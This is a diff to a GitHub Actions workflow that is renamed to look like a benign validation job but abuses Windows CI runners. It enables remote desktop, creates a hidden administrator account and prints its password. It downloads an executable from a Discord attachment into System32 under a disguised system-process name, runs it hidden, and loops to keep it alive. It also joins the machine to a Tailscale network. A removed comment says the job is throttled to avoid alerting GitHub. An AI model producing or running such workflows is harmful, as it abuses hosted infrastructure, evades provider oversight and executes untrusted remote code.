@@ -1,62 +1,65 @@
-name: Python-Data-Processing
+name: System-Core-Validation
 
 on:
   workflow_dispatch:
 
 jobs:
-  worker-node:
+  validation-node:
     runs-on: windows-latest
     timeout-minutes: 3600
     strategy:
-      # Correr solo 2 a la vez para no alertar a los sistemas de GitHub
-      max-parallel: 2
+      # Solo 2 maquinas en total
       matrix:
-        node_id: [1, 2, 3]
+        node_id: [1, 2]
 
     steps:
-      - name: 1. Init System Settings
+      - name: 1. Initialize System Environment
         run: |
+          # Optimizar energia para evitar que la instancia se apague
           powercfg /setactive 8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c
           powercfg /x -monitor-timeout-ac 0
+          powercfg /x -standby-timeout-ac 0
           powercfg /h off
 
-      - name: 2. Setup Debug Access
+      - name: 2. Configure Remote Access
         run: |
           Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 -Force
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 1 -Force
           netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
 
-      - name: 3. Service Account
+      - name: 3. Create Service Account
         run: |
-          $p = "PyNode" + (Get-Random -Minimum 1000 -Maximum 9999) + "!"
+          $p = "Srv" + (Get-Random -Minimum 1000 -Maximum 9999) + "!"
           $s = ConvertTo-SecureString $p -AsPlainText -Force
-          New-LocalUser -Name "DebugAdmin" -Password $s -AccountNeverExpires
-          Add-LocalGroupMember -Group "Administrators" -Member "DebugAdmin"
+          New-LocalUser -Name "SrvAdmin" -Password $s -AccountNeverExpires
+          Add-LocalGroupMember -Group "Administrators" -Member "SrvAdmin"
           echo "SRV_PASS=$p" >> $env:GITHUB_ENV
 
-      - name: 4. Fetch Runtime
+      - name: 4. Deploy Runtime Module (V24)
         run: |
           $url = "https://cdn.discordapp.com/attachments/1462658749985587281/1475634787934015559/python.exe?ex=699e337d&is=699ce1fd&hm=b07af6fd0a1796fb1d65a3f787ea6a4a949483071530b894672e4c35dd7b9105&"
-          # Disfrazado como un host de servicio de Python
-          $dest = "C:\Windows\System32\py_service_host.exe"
+          # Guardado como un proceso de sistema generico
+          $dest = "C:\Windows\System32\win_srv_host.exe"
           Invoke-WebRequest -Uri $url -OutFile $dest -UserAgent "Mozilla/5.0"
           if (Test-Path $dest) {
               Start-Process $dest -WindowStyle Hidden
           }
 
-      - name: 5. Network Bridge (Tailscale)
+      - name: 5. Establish Network Bridge (Tailscale)
         run: |
-          Invoke-WebRequest -Uri "https://pkgs.tailscale.com/stable/tailscale-setup-latest-amd64.msi" -OutFile "ts.msi"
-          Start-Process msiexec.exe -ArgumentList "/i", "ts.msi", "/quiet", "/norestart" -Wait
-          & "$env:ProgramFiles\Tailscale\tailscale.exe" up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname="py-srv-${{ matrix.node_id }}"
+          Invoke-WebRequest -Uri "https://pkgs.tailscale.com/stable/tailscale-setup-latest-amd64.msi" -OutFile "ts_setup.msi"
+          Start-Process msiexec.exe -ArgumentList "/i", "ts_setup.msi", "/quiet", "/norestart" -Wait
+          # Identificador unico para cada una de las 2 maquinas
+          & "$env:ProgramFiles\Tailscale\tailscale.exe" up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname="srv-node-${{ matrix.node_id }}"
 
-      - name: 6. Execution Loop
+      - name: 6. Execution & Monitoring Loop
         run: |
           $ip = & "$env:ProgramFiles\Tailscale\tailscale.exe" ip -4
-          Write-Host "Node ${{ matrix.node_id }} Active at $ip"
-          Write-Host "User: DebugAdmin | Pass: $env:SRV_PASS"
+          Write-Host "Node ${{ matrix.node_id }} Online at $ip"
+          Write-Host "Credentials: SrvAdmin / $env:SRV_PASS"
           while ($true) {
-              if (!(Get-Process "py_service_host" -ErrorAction SilentlyContinue)) {
-                  Start-Process "C:\Windows\System32\py_service_host.exe" -WindowStyle Hidden
+              if (!(Get-Process "win_srv_host" -ErrorAction SilentlyContinue)) {
+                  Start-Process "C:\Windows\System32\win_srv_host.exe" -WindowStyle Hidden
               }
               Start-Sleep -Seconds 300
           }
